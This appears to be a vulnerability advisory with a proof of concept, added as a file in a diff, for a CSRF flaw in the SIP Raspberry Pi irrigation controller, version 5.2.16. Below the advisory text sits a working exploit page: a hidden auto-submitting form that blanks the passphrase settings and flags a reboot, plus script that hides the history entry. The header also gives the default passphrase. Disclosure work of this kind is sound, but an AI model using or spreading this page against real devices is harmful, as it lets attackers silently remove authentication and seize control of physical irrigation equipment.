@@ -1,0 +1,85 @@
+<!--
+
+SIP Sustainable Irrigation Platform 5.x CSRF Disable Passphrase Authorization
+
+
+Vendor: Dan-in-CA
+Product web page: https://github.com/Dan-in-CA/SIP
+Affected version: 5.2.16
+
+Summary: SIP is a free Raspberry Pi based Python program for
+controlling irrigation systems (sprinkler, drip, hydroponic,
+etc). It uses web technology to provide an intuitive user
+interface (UI) in several languages. The UI can be accessed
+in your favorite browser on desktop, laptop, and mobile devices.
+SIP has also been used to control pumps, lights, and other Irrigation
+related equipment.
+
+Desc: The application performs state-changing actions through
+HTTP GET requests without including any anti-CSRF token or validating
+the request origin. This can be exploited to perform administrative
+actions such as disabling the passphrase, rebooting the device, deleting
+programs or installing plugins if a logged-in administrator is lured
+into visiting a malicious web page. When the optional passphrase is
+not enabled (factory default) these actions are additionally available
+to any unauthenticated user, and where the passphrase is enabled it
+defaults to 'opendoor'.
+
+Tested on: Debian GNU/Linux 11 (bullseye) raspberrypi 6.1.21+ (armv6l/aarch64)
+           Python 3.9.2
+
+
+Vulnerability discovered by Anja Ivanovska
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5995
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5995
+
+
+24.06.2026
+
+-->
+
+
+<html>
+  <body>
+    <form action="http://SIP/co">
+      <input type="hidden" name="oname" value="ZSL" />
+      <input type="hidden" name="oloc" value="" />
+      <input type="hidden" name="olang" value="default" />
+      <input type="hidden" name="otf" value="on" />
+      <input type="hidden" name="ohtp" value="80" />
+      <input type="hidden" name="ohtip" value="&#58;&#58;" />
+      <input type="hidden" name="owl" value="42" />
+      <input type="hidden" name="s0" value="S01" />
+      <input type="hidden" name="s1" value="S02" />
+      <input type="hidden" name="s2" value="S03" />
+      <input type="hidden" name="s3" value="S04" />
+      <input type="hidden" name="s4" value="S05" />
+      <input type="hidden" name="s5" value="S06" />
+      <input type="hidden" name="s6" value="S07" />
+      <input type="hidden" name="s7" value="S08" />
+      <input type="hidden" name="onbrd" value="0" />
+      <input type="hidden" name="osdt" value="0" />
+      <input type="hidden" name="omton" value="0" />
+      <input type="hidden" name="omtoff" value="0" />
+      <input type="hidden" name="orst" value="on" />
+      <input type="hidden" name="olg" value="on" />
+      <input type="hidden" name="olr" value="100" />
+      <input type="hidden" name="opw" value="" />
+      <input type="hidden" name="npw" value="" />
+      <input type="hidden" name="cpw" value="" />
+      <input type="hidden" name="omas" value="0" />
+      <input type="hidden" name="i0" value="0" />
+      <input type="hidden" name="sh0" value="3" />
+      <input type="hidden" name="w0" value="0" />
+      <input type="hidden" name="m0" value="" />
+      <input type="submit" value="NoAuth" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
